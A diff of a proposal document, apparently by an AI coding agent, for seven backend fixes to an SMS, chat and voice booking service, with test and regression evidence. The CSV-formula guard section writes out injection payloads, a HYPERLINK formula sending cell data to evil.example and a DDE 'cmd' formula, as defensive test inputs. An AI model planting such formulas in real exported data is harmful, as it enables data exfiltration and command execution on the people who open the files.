@@ -1,8 +1,20 @@
-# Backend proposals: SMS keyword normalization and chat 403 refusals
+# Backend proposals: SMS keywords, chat 403s, SMS safety trim, truthful tool results, callback promise, CSV formulas, missed-call promise
 
 Base: `dfb0ae7846e66871d849c67566bf9d3b475f46ae`. Backend owner: Codex.
 
-**Status: proposed, not applied. Revision 2 addresses the independent QA notes in `qa/`.** None of the tracked files in this worktree were changed (`git status` shows only this untracked folder). Each patch was applied only to throwaway copies outside the worktree, and all tests ran there. Both patches apply cleanly to dfb0ae78 (`git apply --check`), each on its own or together. They touch separate files.
+**Status: proposed, not applied. Revision 2 addresses the independent QA notes in `qa/`.** None of the tracked files in this worktree were changed (`git status` shows only this untracked folder). Each patch was applied only to throwaway copies outside the worktree, and all tests ran there. All seven patches apply cleanly to dfb0ae78 (`git apply --check`), each on its own or all together, in either order. Applying them in the order 01→07 and in the order 07→01 gives byte-identical trees.
+
+Shared files:
+- `02` and `04` both touch `chat.mjs`.
+- `03` and `04` both touch `sms-agent-background.mjs`.
+- `04` and `05` both touch `lib/config.mjs`.
+- `06` touches only `client.mjs` and a new `lib/spreadsheet-cell.mjs`, and `07` only `voice.mjs`.
+
+None of their hunks overlap.
+
+**Round 3 (proposals 3 to 5)** comes from the AI conversations review, findings R1 to R3 (`/tmp/mc-claude-ai-conversations-review-20261110/qa-artifacts/claude-collaboration/ai-conversations-review/REVIEW.md`).
+
+**Round 4 (proposals 6 and 7)** comes from the coverage-map blind spots D1 to D3 (`/tmp/mc-claude-coverage-map-20261110/qa-artifacts/claude-collaboration/blind-spot-checks/`).
 
 Everything ran offline: memory store or an in-process Blobs double, `MC_FAKE_MODEL=1`, provider env removed, and outbound networking denied. The only network access was reading the CTIA PDF. Browser runs used the bundled `chrome-headless-shell-1223`.
 
@@ -14,6 +26,16 @@ Everything ran offline: memory store or an in-process Blobs double, `MC_FAKE_MOD
 | `chat-403-check.mjs` | Proposal 2 acceptance check (28 checks) |
 | `widget-stream-403-real.mjs` + `.diff` | Refreshed widget-stream suite, fed the real 403 bodies from the handler |
 | `widget-403-cors-probe.mjs` | Real cross-origin browser probe: two loopback origins, with the real handler behind `/api/chat` |
+| `03-sms-trim-safety.patch` | Proposal 3: `sms-agent-background.mjs` |
+| `04-tool-result-truth.patch` | Proposal 4: `lib/send.mjs`, `lib/desk.mjs`, `chat.mjs`, `sms-agent-background.mjs`, `vapi.mjs`, and one prompt line in `lib/config.mjs` |
+| `05-callback-promise.patch` | Proposal 5: `lib/config.mjs`, `lib/vapi.mjs` |
+| `sms-trim-safety-check.mjs` | Proposal 3 acceptance check (40 cases, real SMS agent handler) |
+| `tool-result-truth-check.mjs` | Proposal 4 acceptance check (39 checks, real chat, SMS-agent and Vapi handlers) |
+| `callback-promise-check.mjs` | Proposal 5 acceptance check (23 assembled prompts) |
+| `06-csv-formula-guard.patch` | Proposal 6: new `lib/spreadsheet-cell.mjs`, plus `client.mjs` |
+| `07-missed-call-promise.patch` | Proposal 7: `voice.mjs` |
+| `csv-injection-check.mjs` | Proposal 6 acceptance check (4 real CSV exports) |
+| `missed-call-promise-check.mjs` | Proposal 7 acceptance check (10 checks, real `/api/voice`) |
 | `receipts/` | Logs and JSON for every run cited below |
 
 ---
@@ -228,5 +250,348 @@ I checked this by reading the code and by an access log.
 
 ---
 
+## Proposal 3: never drop safety text when trimming SMS replies
+
+Source: AI conversations review, finding R1 (`/tmp/mc-claude-ai-conversations-review-20261110/qa-artifacts/claude-collaboration/ai-conversations-review/REVIEW.md`).
+
+### Problem
+`netlify/functions/sms-agent-background.mjs:37-38` takes the first sentence of the legacy SMS reply and deletes it when it starts with `have|need|got|book|call|now|phone filled|ok, i|ok, let|let me`, is under 12 words, and more than 10 characters follow. A reply that correctly puts the safety line first, such as "Call 911 and get everyone outside now. I saved your request…", is sent as "I saved your request…". The prompt orders exactly that shape: `lib/config.mjs:303` ("begin the customer-facing reply with the safety script") and `lib/agent.mjs:14` (`DELIVERY_CONTRACT`: "begin that final reply with the prescribed safety guidance").
+
+### Why the trim exists
+`git log -L37,38` shows that it came in with f9bbfb70 (2026-10-19, ticket S1-21 "SMS replies never carry the model's planning text"). 811e8caf only changed the `logEvent` argument. `product/SPRINT.md` (S1-11 verification) gives the reason: an SMS reply after booking began "Have name, address, issue, window. Phone filled automatically. Book." The main fix was `dropToolPreamble` in `runAgent`. This regex was added as a "last-resort first-sentence filter" for the same planning notes, with the word list taken from that one sample. `call` and `now` were meant for notes like "Call book_visit." and "Now book." They were never meant for customer instructions.
+
+### Change (`03-sms-trim-safety.patch`, one file)
+- The trim condition gains `&& !isSafetySentence(c, first)`. Everything else about the trim is unchanged, including the `reply_trimmed` event.
+- `isSafetySentence` is added below the handler. A first sentence is never trimmed when:
+  - it contains a life-safety word: 911, emergency, gas, leave, outside, evacuate, fire, smoke, carbon monoxide or monoxide, "get (everyone) out", "out of the house/home/building", `CO` (case-sensitive), or the Spanish emergencia, salga, salir, afuera, incendio, humo, monóxido; **or**
+  - it quotes the shop's **configured safety script**. That is `rules.emergencies.script`, or the old string form, read the way `normalizeEmergencies` reads it, else the default script. The sentence counts as a quote when it is a 3-or-more-word span of the script, or when it contains a whole sentence of the script. Owner scripts carry no keyword guarantee, so this is what protects "Now walk away from the house and phone Atmos at 888-286-6700."
+  - **Exception:** a sentence that names a tool (`book_visit`, `notify_owner`, `update_visit`, `get_availability`) is always planning and is still trimmed. Example: "Call notify_owner with urgency emergency."
+- The helper reads the script inline, with no new import. This keeps the patch's hunks clear of the import lines that `04` edits, so `03` and `04` apply in either order.
+
+### Rationale: why a guard and not a narrower regex
+- **Narrowing the regex** (for example, dropping `call` and `now`) would still let "Need you to leave the area now." and "Have everyone step outside now." be trimmed. It would also stop trimming the planning notes S1-21 targets ("Now book.", "Call book_visit."), so it changes more behaviour while protecting less.
+- **Deleting the trim** (the review's first suggestion) is defensible, because `dropToolPreamble` already withholds pre-tool text. But it reopens S1-21 for any planning text the model writes in its final turn.
+- **The guard is the narrowest safe fix.** Its behaviour differs from base only when the sentence the base would drop is safety text. In that case the base was wrong.
+
+### Evidence
+`sms-trim-safety-check.mjs` runs the **real** `sms-agent-background.mjs` handler for each case (memory store, `ADMIN_KEY` header). The model is the `MC_FAKE_MODEL=1` seam, pointed by a loader hook at a stub that returns the case's reply. The check compares two things with the expectation: the body handed to `sendSMS` (the `[sms:disabled] … :: body` line) and the stored assistant turn. It makes no network calls.
+
+There are 40 cases:
+- **27 "keep" cases:**
+  - 17 English emergency first sentences, including the review's R1 cases, "call the gas company", CO, carbon monoxide, fire, smoke and evacuate;
+  - 3 owner-script cases (two configured scripts with no keyword);
+  - 4 Spanish or mixed-language cases;
+  - the default script;
+  - 2 ordinary replies.
+- **13 "trim" cases:**
+  - the S1-21 planning notes ("Have name, address, issue, window.", "Phone filled automatically.", "Book it now.", "Need address…", "Got everything.", "OK, I'll book that.", "Let me check availability.", "Now call book_visit.");
+  - a planning sentence that names a tool and contains "emergency";
+  - planning first and safety second;
+  - unrelated planning on shops with owner scripts;
+  - **a control:** the owner-A sentence on a shop *without* that script is trimmed. This shows that the owner-script results come from the configuration, not from the word list.
+
+Results:
+
+| Copy | Result | Receipt |
+|---|---|---|
+| Base dfb0ae78 | **FAIL, 23 of 40.** Every failure is a safety sentence that was dropped. Examples: "Call 911 and get everyone outside now. I saved your request…" is sent as "I saved your request for Ray; what is the address?", and "Call Atmos at 888-286-6700 and stay off the property. We will follow up…" is sent as "We will follow up. What is the street address?". "Llame al 911…" survives on base only because it does not start with an English trigger word. | `receipts/sms-trim-safety-base.{log,json}` |
+| `03` alone | **PASS, 40 of 40** | `receipts/sms-trim-safety-patched.{log,json}` |
+| All five patches | **PASS, 40 of 40** | `receipts/sms-trim-safety-all-five.{log,json}` |
+| All seven patches | **PASS, 40 of 40** | `receipts/sms-trim-safety-all-seven.{log,json}` |
+
+### Risks
+- **Fail-safe direction.** A planning note that happens to contain a safety word ("Need to leave a note for Ray.") is now sent instead of trimmed. That is a cosmetic leak, in the safe direction. The tool-name exception covers the common planning form.
+- **The word list is policy.** Adding a word only widens the guard. "gas" also matches "gas furnace" and "gas water heater", so such a first sentence is now never trimmed.
+- **This does not validate owner scripts** (review R5: an owner can configure a dangerous DIY script). It only stops the trim from deleting whatever script is configured.
+
+---
+
+## Proposal 4: truthful tool results about notifications
+
+Source: review finding R2.
+
+### Problem
+On legacy tenants, the tool result handed to the model claims an alert or text that may never have gone out:
+
+| Line | Tool result text at dfb0ae78 |
+|---|---|
+| `chat.mjs:184` | "Booked. Ref X. Ray has the details and the customer will get a text reminder." |
+| `chat.mjs:185` | "Ray has been texted. Ref X." |
+| `sms-agent-background.mjs:23` | "Owner texted. Ref X." |
+| `sms-agent-background.mjs:28` | "… The owner has been told." |
+| `sms-agent-background.mjs:29` | "Cancel request sent to the owner …" |
+| `vapi.mjs:65` | "… The owner has the details and the customer will get a text reminder." |
+| `vapi.mjs:66` | "The owner has been texted, reference X." (also for spam) |
+
+`notifyOwner` returns the per-channel results (`lib/send.mjs:99-104`), but every caller discards them. The callers are `lib/desk.mjs:315-317` (the booking confirmation text and the owner alert), `:416`, `:437`, `:653` and `:659`. Line 22 (`Booked. Ref X.`) made no claim, but got the same note for consistency.
+
+### Sync or queued?
+For legacy tenants, `sendSMS` and `sendEmail` are **synchronous, awaited provider POSTs** inside the tool call (`lib/send.mjs:65`, `:88`). Nothing is queued in our system. `ok:true` means Twilio accepted the message (HTTP 201, Twilio status "queued") or Resend accepted it. Delivery to the handset is not known at that point. The truthful wording is therefore "**accepted by the provider; delivery and reading are not confirmed**". It is neither "delivered" nor "queued". Self-service tenants do queue through `queueSavedDelivery`, but their tool-result strings are already honest and are **unchanged**.
+
+### Change (`04-tool-result-truth.patch`)
+- **`lib/send.mjs` `notifyOwner`** labels each result with `channel: "text"` or `"email"`. Its return value had no readers before.
+- **`lib/desk.mjs`:**
+  - A module-level `WeakMap` keeps the send outcome beside the record returned by `bookVisit`, `flagLead`, `rescheduleVisit` and `cancelRequest`. It is never saved with the record.
+  - `flagLead` records `{merged:true}` when a repeat within 30 minutes changed nothing and so sent no alert.
+  - A new exported helper, `deliveryNote(c, record)`, builds the sentence:
+    - **At least one owner alert accepted:** "Ray was sent a text and an email with the details (accepted by the provider; delivery and reading are not confirmed)."
+    - **None accepted, or nothing configured:** "It is saved, but Ray could not be alerted yet (the alert did not go out | no owner phone or email is on file). Do not tell the customer that Ray was texted, emailed or told, and do not promise a callback time; say it is saved for Ray to review."
+    - **Merged repeat:** "This matched an open request from the last 30 minutes (ref X) and nothing changed, so no new alert was sent. Do not say a new text was sent."
+    - **Booking confirmation text to the customer (web and voice only):** "…accepted for delivery, and reminder texts are scheduled." or "…was not sent. Do not promise a confirmation text or text reminders." A missing customer phone counts as not sent.
+    - **No recorded outcome:** "Whether Ray was alerted is not confirmed." plus the same do-not-claim line.
+- **Callers.** The **shape is unchanged**: `{content, event}` for chat and SMS, `{toolCallId, result}` for Vapi, and the same events and `[Done: …]` markers. Only the text changes:
+  - chat: `Booked. Ref X. <note>` and `Request saved. Ref X. <note>`;
+  - SMS: the same, plus `Moved ref X to D W. <note>` and `Cancel request saved for ref X; the visit stays until the owner confirms. <note>`;
+  - Vapi: `Booked, reference X. <note>`, `Request saved, reference X. <note>`, and spam now reads "Noted as spam; the owner was not alerted."
+- **`lib/config.mjs:294` (legacy consent line).** The prompt orders the model to say "You'll get appointment texts from {name}…" after every booking. The patch appends: "If the book_visit result says the confirmation text was not sent, skip that line and do not promise texts." Without this, the prompt would contradict the new tool result. SMS bookings never get that note, so on SMS the line is still said.
+
+### Evidence
+`tool-result-truth-check.mjs` calls the real handlers in-process:
+- `chat.mjs` (legacy web, allowed origin);
+- `sms-agent-background.mjs` (`notify_owner`, `book_visit`, and `update_visit` reschedule and cancel_request on the booking it just made);
+- `vapi.mjs` (`tool-calls` message).
+
+The model is the `MC_FAKE_MODEL=1` seam, pointed by a loader hook at a stub that calls one tool and records the `tool_result` it gets back. For Vapi, the check reads the `result` that is returned to Vapi. It uses the memory store and denies sockets. The check runs in two child processes, because `send.mjs` reads the provider env once:
+- **"unconfigured":** empty env, so every send returns `disabled`. This is the review's evidence condition.
+- **"provider":** offline placeholder Twilio and Resend values (no real keys), with an in-process fetch double for `api.twilio.com` and `api.resend.com` that accepts or refuses per case. Any other URL is refused and counted (0).
+
+There are 39 checks:
+- each send state (disabled; both refused; both accepted; text refused but email accepted) is run through every tool and channel above;
+- a merged repeat lead;
+- no owner contact on file;
+- voice spam;
+- the conditional consent line in the assembled prompt.
+
+Each tool result is asserted against what the double actually saw. A "false claim" is a check where the tool result claims a text, email or alert that the provider did not accept, or that never ran.
+
+| Copy | Result | Receipt |
+|---|---|---|
+| Base dfb0ae78 | **FAIL, 39 of 39**, of which **22 are false claims**: "Ray has been texted" with SMS and email disabled or refused, after a merged repeat that sent nothing, with no owner contact on file, and for voice spam. The other 17 fail only because the base text cannot say what really happened, for example "Owner texted" when only the email went through. | `receipts/tool-result-truth-base.{log,json}` |
+| `04` alone | **PASS, 39 of 39**, 0 false claims, 0 other requests | `receipts/tool-result-truth-patched.{log,json}` |
+| All five patches | **PASS, 39 of 39** | `receipts/tool-result-truth-all-five.{log,json}` |
+| All seven patches | **PASS, 39 of 39** | `receipts/tool-result-truth-all-seven.{log,json}` |
+
+### Risks
+- **The tool-result text is longer.** With a real model, the "Do not tell the customer…" line is an instruction. The fake model cannot show that the real model obeys it.
+- **Fewer reassurances when texting is not set up.** In a legacy shop with no Twilio or Resend configuration, the model will now say "saved for Ray to review" instead of "Ray has been texted". That is the point of the change, but the owner will see it.
+- **The WeakMap depends on object identity.** The note is attached to the exact object that `bookVisit`, `flagLead`, `rescheduleVisit` or `cancelRequest` returns. A future caller that clones the record before calling `deliveryNote` gets the "not confirmed" wording. That is fail-safe.
+- **A thrown provider call still propagates.** If the provider POST throws (a network error rather than an HTTP error), `notifyOwner` throws after the record is saved, just as at base. `runAgent` then gives the model its existing "outcome is unconfirmed" text (`lib/agent.mjs:10`). I did not change that path.
+- **Twilio acceptance is not delivery.** The wording says so. Delivery receipts (status callbacks) are not read anywhere for legacy tenants.
+
+---
+
+## Proposal 5: no timed callback promise in legacy prompts
+
+Source: review finding R3. This was easy and isolated: two files and prompt wording only.
+
+### Problem
+- `lib/config.mjs:255` builds the legacy callback phrase: "say Ray will call them within 30 minutes", "… when the shop opens at 7 am this morning" or "… by 8 am tomorrow". It uses `rules.callbackHours` and `callbackAfterHours`, which `newClient` (`config.mjs:172`) and `client.mjs:269-270` fill with those defaults for every shop.
+- `config.mjs:288` adds "Never say 'someone will call you back' without the window."
+- `lib/vapi.mjs:50-54` repeats the timed promise in both voice branches.
+- Nothing guarantees the call. `trackCallback` and the overdue note (`lib/desk.mjs:366-386`) only remind the owner.
+
+### Change (`05-callback-promise.patch`)
+- **`config.mjs:255`, legacy branch.** The phrase is now "Ray will get their details and follow up", plus "(the shop is closed and opens at 7 am this morning)" or "(the shop is closed right now)" when the shop is closed. The self-service (v1) phrase is untouched.
+- **`config.mjs:288`.** The rule is now "Never promise a callback time or say someone will call within a set time."
+- **`lib/vapi.mjs:50-54`.** Both voice branches say "Ray will get their details and follow up", with the same rule. The now-unused `window` and `r` locals are removed.
+- **Unchanged on purpose:** `rules.callbackHours` and `callbackAfterHours` still drive the owner-side overdue tracking (`desk.mjs:340-386`). The portal setting still exists; it just no longer reaches customers through the prompt.
+
+### Evidence
+`callback-promise-check.mjs` assembles the real prompts:
+- `buildSystemPrompt` on the web, SMS and test channels, with the shop open, closed, and opening later today;
+- `voicePrompt`, plain and with transfer-all;
+- for a legacy shop on default rules and for one with owner-typed values ("within 15 minutes", "first thing tomorrow").
+
+It asserts that no timed phrase remains and that the handoff line says "Ray will get their details and follow up" and "Never promise a callback time". It also asserts that the v1 wording is unchanged.
+
+| Copy | Result | Receipt |
+|---|---|---|
+| Base | **FAIL, 22 of 23.** Only the v1 row passes. | `receipts/callback-promise-base.{log,json}` |
+| `05` alone | **PASS, 23 of 23** | `receipts/callback-promise-patched.{log,json}` |
+| All five patches | **PASS, 23 of 23** | `receipts/callback-promise-all-five.{log,json}` |
+| All seven patches | **PASS, 23 of 23** | `receipts/callback-promise-all-seven.{log,json}` |
+
+### Risks and decisions for the owner
+- **This is a product decision** (R3 names the owner). Shops that deliberately configured a callback promise lose it in the customer conversation. The alternative is to keep it only when the owner has explicitly accepted it as a service-level promise. That needs a new "accepted" flag, because the stored default cannot be told apart from an owner-typed value.
+- **Not changed (other places the promise still reaches customers or local tests):**
+  - `lib/desk.mjs:574-576` texts the customer "`<owner>` will call you `<callbackHours>`" (template `fallback_window`, `desk.mjs:85`, `:90`) when the owner has **not** acknowledged an alert. That is a timed promise made exactly when the owner is unresponsive, and it should get the same rewording.
+  - `lib/fake-model.mjs:27` still falls back to "within 30 minutes" when the prompt has no "will call them" phrase. This is test-only output, but local fake-model transcripts will keep showing the old promise.
+  - `lib/rubric-eval.mjs:11`, `:74` and `:84` contain the old promise in sample rubric dialogues.
+
+---
+
+---
+
+## Proposal 6: owner CSV downloads neutralise spreadsheet formulas (security)
+
+Source: coverage-map blind spot D1 (`/tmp/mc-claude-coverage-map-20261110/qa-artifacts/claude-collaboration/blind-spot-checks/account-actions-ui-check.mjs`).
+
+### Problem
+- `netlify/functions/client.mjs:585` (`csvCell`, used by `csv()` at `:586`) quotes cells but does not neutralise formulas. The owner's bookings, leads, customers and conversations downloads (`exportCSV`, `:592-646`) therefore carry customer-typed text verbatim, and customers control most of those fields. A name, issue or message such as `=HYPERLINK("https://evil.example/?x="&A1,"Click")`, `@SUM(1+1)`, `-2+3` or ` =cmd|' /C calc'!A0` runs as a formula when the owner opens the file in Excel, Numbers or Sheets. This is OWASP "CSV Injection": data exfiltration through links, and DDE command execution on older Excel.
+- `lib/intake.mjs:135-138` already guards its own export: a cell matching `/^\s*[=+\-@]/` or `/^[\t\r]/` gets a leading apostrophe.
+
+### Change (`06-csv-formula-guard.patch`)
+- **New `lib/spreadsheet-cell.mjs`** with `formulaSafe(text)`. It uses the **same trigger rule as intake**: `= + - @` after optional whitespace, or a leading tab or CR, gets an apostrophe prefix.
+  - **One deliberate exception:** a plain signed number, `/^[+-]?\d+(\.\d+)?$/`, is left as is. That covers E.164 phones such as `+17135550123`, and values like `-5` or `12.50`. Such a value has no operator, reference or function after the sign, so it cannot execute or exfiltrate anything.
+  - The phone columns stay usable for the Jobber and Housecall Pro import that the customers export is built for (`client.mjs:629`). With the plain intake rule, every phone would become `'+17135550123`.
+- **`client.mjs`:** `csvCell` runs the text through `formulaSafe` before quoting. One import line is added.
+- **`lib/intake.mjs` is unchanged.** Its rule is identical apart from the number exception. Its export has no phone column today, and it could adopt the shared helper later.
+
+### Why an apostrophe prefix
+- It is the accepted practice (OWASP), and intake already uses it, so owners see one convention.
+- The value stays readable and searchable.
+- Alternatives:
+  - a leading space or tab: Excel can still evaluate a cell with a leading space;
+  - stripping the characters: this loses data such as "-2+3" or "@home";
+  - a "safe" format such as XLSX: a much larger change.
+
+### Evidence
+`csv-injection-check.mjs` saves records through the real `bookVisit`, `flagLead` and `saveConversation`, calls the **real `client.mjs` handler** (`GET ?c=&k=&export=bookings|leads|customers|conversations`, legacy owner key), and parses each CSV. Hostile values:
+- `=HYPERLINK(…)`, `@SUM(1+1)`, `-2+3`, ` =cmd|…`, `+cmd|…`;
+- tab and CR prefixes (in conversation messages, which are stored verbatim; `desk.mjs:39` trims booking and lead fields);
+- the normal phone `+17135550123`.
+
+The check asserts three things: every hostile value is exported with the apostrophe; no cell still starts like a formula; and the phone is exported unchanged.
+
+| Copy | Result | Receipt |
+|---|---|---|
+| Base | **FAIL, 4 of 4 exports.** 21 live formula cells across bookings (5), leads (5), customers (6) and conversations (5). | `receipts/csv-injection-base.{log,json}` |
+| `06` alone | **PASS, 4 of 4.** The phone is unchanged. | `receipts/csv-injection-patched.{log,json}` |
+| All seven | **PASS** | `receipts/csv-injection-all-seven.{log,json}` |
+
+The D1 browser check from the coverage map was not rerun. It drives the account page download UI. The handler-level check above covers the server output it depends on.
+
+### Risks
+- **Visible apostrophes.** Cells that legitimately start with `-` or `+` followed by text (for example "- left voicemail" in notes) now show a leading apostrophe in a spreadsheet. That is the standard trade-off.
+- **The number exception is policy.** Widening it, for example to allow spaces or parentheses in phones, must not admit operators.
+
+---
+
+## Proposal 7: missed-call text-back promises only a text that was sent
+
+Source: coverage-map blind spots D2 and D3 (`/tmp/mc-claude-coverage-map-20261110/qa-artifacts/claude-collaboration/blind-spot-checks/missed-call-textback-check.mjs`; base evidence `evidence/claude-blind-missed-call-textback-dfb0ae78.json`).
+
+### Problem
+- **D2.** `netlify/functions/voice.mjs:85-87` builds the spoken line "We are texting you this second so we can get you scheduled." (in Spanish, "Le enviamos un mensaje de texto ahora mismo") **before** deciding whether to text. `:108` always plays it. The caller hears the promise when:
+  - they opted out;
+  - text-back is off;
+  - they were texted in the last 24 hours;
+  - the provider refused the text;
+  - texting is not set up.
+- **D3.** The owner note at `:106` says "No texting sender yet, so no text-back." for **every** failed send, including a provider refusal when a sender exists. It also says "Text-back sent" when the send was only logged because texting is not configured (`r.logged`).
+
+### Change (`07-missed-call-promise.patch`, one file)
+- **The spoken line is chosen after the send.**
+  - The existing promise (English and Spanish) is spoken only when `sendSMS` returned `ok` (the provider accepted it).
+  - In every other case the caller hears "Please call back or send a text to this number, and we will get you scheduled." (in Spanish, "Por favor vuelva a llamar o envíenos un mensaje de texto a este número."). This promises nothing.
+  - Twilio reads the TwiML only after the handler returns, so choosing the line after the send adds no delay for the caller.
+- **The owner note gives the real reason:**
+
+  | Outcome | Owner note |
+  |---|---|
+  | Sent | "Text-back sent; …" |
+  | Logged | "Texting is not set up yet, so no text-back was sent. Please call them back." |
+  | Failed | "The text-back could not be sent (`<provider message>`). Please call them back." |
+  | Opted out | "They opted out, so no text-back. …" (wording kept compatible with the reference check) |
+  | Recent | "They were already sent a text-back in the last 24 hours, so no new one." |
+  | Text-back off | "Text-back is off for this line, …" |
+  | No caller ID | "No caller ID, …" |
+
+- **Unchanged:**
+  - the send logic and 24-hour rule;
+  - the events (`text_back_skipped`, `missed_call.textBack`);
+  - the saved conversation message;
+  - the TwiML shape (`<Say>…<Hangup/>`).
+
+### Evidence
+`missed-call-promise-check.mjs` is built on the reference check. It uses the real `/api/voice` handler with a signed webhook, the real send path, synthetic Twilio values and an in-process fake Messages API, and no network. Cases:
+- a new caller (promise kept), in English and Spanish;
+- an opted-out caller, in English and Spanish;
+- text-back off;
+- a caller texted in the last 24 hours;
+- a provider refusal (owner reason checked);
+- texting not configured, run in a child process with no Twilio env, so the send is only logged;
+- no transport.
+
+| Copy | Result | Receipt |
+|---|---|---|
+| Base | **FAIL, 6 of 10.** The promise is spoken in all five no-text cases, and the owner gets "No texting sender yet" after a provider refusal. | `receipts/missed-call-promise-base.{log,json}` |
+| `07` alone | **PASS, 10 of 10** | `receipts/missed-call-promise-patched.{log,json}` |
+| All seven | **PASS** | `receipts/missed-call-promise-all-seven.{log,json}` |
+
+The **reference check itself**, copied unmodified into the throwaway copies, gives these results:
+- base: 7 of 9 passing, failing D2 and D3 (its own evidence file);
+- `07` alone: **9 of 9**;
+- all seven: **9 of 9**.
+
+Receipts: `receipts/ref-missed-call-textback-{p07,all}.log`.
+
+### Risks
+- **Callers hear the promise less often.** They now hear it only when Twilio accepted the text. With texting not set up (dev or test shops), no caller hears it.
+- **The provider error goes to the owner.** The note includes Twilio's error message (up to 120 characters). It goes only to the owner's own phone or email.
+- **Not changed:** a "logged" send (no texting configured) is still saved as a missed-call text-back in the conversation (`voice.mjs:97-100`). A real call within 24 hours is therefore treated as "recent" and gets no text-back. That only matters for shops without texting, where nothing can be sent anyway.
+
+---
+
+## Regressions for proposals 3 to 7
+
+### Method
+- **Which scripts.** The candidates were every `scripts/*.mjs` file that references `chat.mjs`, `sms-agent-background.mjs`, `sms.mjs`, `vapi.mjs`, `voice.mjs`, `lib/config.mjs`, `lib/desk.mjs`, `lib/send.mjs`, `lib/vapi.mjs`, or `/api/chat|vapi|sms|voice`. That is 126 files. 117 were run. These 9 were not:
+  - `sales-desk-eval*`, `sales-positioning-eval`: real-model evals;
+  - `stripe-test-lifecycle-proof`: needs a live provider;
+  - `calendar-test-fixtures`, `support-report-fixtures`, `pricing-model`, `hosted-onboarding-guard.mjs`: helpers, not checks.
+
+  The lists are in `receipts/p345-regress-scripts-run.txt` (74 non-browser scripts) and `receipts/p345-regress-scripts-not-run-browser.txt` (43 browser scripts, which were in fact run; see below).
+- **How each script ran.** From the copy root, under `env -i` (PATH and HOME only), with a 300 s alarm. The egress preload `receipts/p345-block-egress.mjs` refused every non-loopback connection. Each script got a fresh `--output scratchpad/<name>-bp2rg.json`, or a positional path for the four scripts that read `argv[2]`. Browser scripts also got `--playwright` pointing at the installed npx Playwright, using the bundled chromium-1223. Runners: `receipts/p345-regress-runner.sh` and `receipts/p345-regress-runner-browser.sh`.
+- **What counted as "the same as base".** For each script: the same exit code, and the same multiset of verdict tokens in its log (`"pass":true/false`, `passed`/`failed` counts, `ok`/`PASS`/`FAIL` lines). The only remaining log differences are timestamps, source hashes of the patched files, random refs, and `smoke`'s module count (137 vs 138; `01` adds a module).
+
+### Results
+
+| Copy | Non-browser (74) | Browser (43) | Same as base? |
+|---|---|---|---|
+| Base dfb0ae78 | 68 pass, 6 fail | 17 pass, 26 fail | n/a |
+| `03`, `04`, `05`, `06`, `07`, each alone | 68 / 6 | not run alone | **yes**, 0 exit-code and 0 verdict differences |
+| `01`+`02`+`03`+`04`+`05` | 68 / 6 | not run | **yes** |
+| All seven | 68 / 6 | 17 / 26 | **yes**, browser included |
+
+Receipts:
+- `receipts/p345-regress-{base,p03,p04,p05,all-five}/`
+- `receipts/p67-regress-{p06,p07}/`
+- `receipts/regress-all-seven/`
+- `receipts/regress-browser-{base,all-seven}/`
+
+Each folder has one log per script and a `SUMMARY.tsv`.
+
+The acceptance checks for proposals 1 and 2 also pass on the all-seven copy:
+- `stop-keywords-check`: 0 of 159 required cases failing;
+- `chat-403-check`: 28 of 28.
+
+Receipts: `receipts/{stop-keywords,chat-403}-all-seven.*`.
+
+### Voice and export scripts (asked for 06 and 07)
+These all exit 0 on base, `06`, `07` and all seven:
+- `smoke` (it runs the missed-call path; on `07` its owner line now reads "Texting is not set up yet, so no text-back was sent", where base said "Text-back sent" for a send that was only logged);
+- `voice-activation-check`, `voice-delivery-independent-check`, `managed-voice-handoff-check`;
+- `account-setup-check`, `customer-account-qa-check` (exports);
+- `conversation-history-check`, `workspace-activity-check`, `website-installation-check`;
+- `conversation-history-ui-check`, `request-automation-ui-check`, `request-followthrough-ui-check`, `platform-sms-check` (browser runs on base and all seven).
+
+### Pre-existing failures (identical on every copy; not caused by any patch)
+- **Non-browser:**
+  - `availability-check`: 401 where it expects 403;
+  - `availability-model-check`: needs `--ledger` and a guarded server;
+  - `capacity-check`: expects a Blobs error text;
+  - `lead-sources-independent-check`: a recovery count assertion;
+  - `phone-activation-qa-check`: exit 13, fatal in its suite;
+  - `readiness-email-admission-qa-check`: needs a `.git` checkout, which the copies do not have.
+- **Browser:** 26 scripts, each of which needs a guarded or real-model server, a pinned historical source hash, extra fixtures, or a server URL:
+  - account-page-ui-qa, appointment-texts-ui, availability-session-ui, availability-ui, complete-connections-ui-qa, connection-journey-ui, customer-budget-ui, customer-journey;
+  - demo-outcome, demo-outcome-model, experience-tours, experience-ui, hosted-onboarding-guard, launch-google-disclosure-qa, launch-po-followthrough, lead-ai-independent;
+  - lead-sources-independent-ui, portal-revamp-ui-qa, sales-desk-baseline, sales-desk-render-repair, service-connections-ui, site-demo, site-demo-model, website-concurrency-ui;
+  - widget-setup-refresh, widget-stream (stale per REFRESH.md).
+
+---
+
 ## Not applied
-Both patches are proposals for the backend owner (Codex). The worktree's tracked files are unchanged at dfb0ae78. Nothing was committed or pushed. The scratch copies were deleted after the runs.
+All seven patches are proposals for the backend owner (Codex). The worktree's tracked files are unchanged at dfb0ae78. Nothing was committed or pushed. The scratch copies were deleted after the runs (rounds 3 and 4: `bp2-copy/`).
+
